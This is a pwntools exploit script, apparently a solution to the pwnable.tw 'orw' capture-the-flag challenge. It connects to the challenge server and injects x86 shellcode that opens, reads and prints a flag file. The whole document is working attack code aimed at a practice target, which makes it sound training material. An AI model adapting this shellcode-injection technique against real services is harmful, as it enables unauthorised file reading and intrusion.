# pwnable-orw-exploit.py
# by Aidan Wech (NashuaRodgers)
# nc chall.pwnable.tw 10001

from pwn import *

def main():
    # connection variables
    host = "chall.pwnable.tw"
    port = 10001

    # variables
    shellcode = asm("""
                    /* Clear all registers */
                    xor eax, eax
                    xor ebx, ebx
                    xor ecx, ecx
                    xor edx, edx

                    /* fd = open("/home/orw/flag.txt") */
                    mov al, 0x5
                    push 0x0067616c
                    push 0x662f7772
                    push 0x6f2f656d
                    push 0x6f682f2f
                    mov ebx, esp
                    int 0x80

                    /* read(fd, stdin, 38) */
                    xor ecx, ecx
                    xor ebx, ebx
                    mov dl, 0x26
                    mov ecx, esp
                    mov bl, 0x3
                    mov al, 0x3
                    int 0x80

                    /* write(stdout, stdin, 38) */
                    mov bl, 0x1
                    mov al, 0x4
                    int 0x80
    """)

    # start remote process
    p = remote(host, port)

    # send shellcode
    p.read(timeout=1)
    p.send(shellcode)

    # reveal flag
    log.info(f"flag: '{p.read(timeout=3)}'")
    p.close()

if __name__ == "__main__":
    main()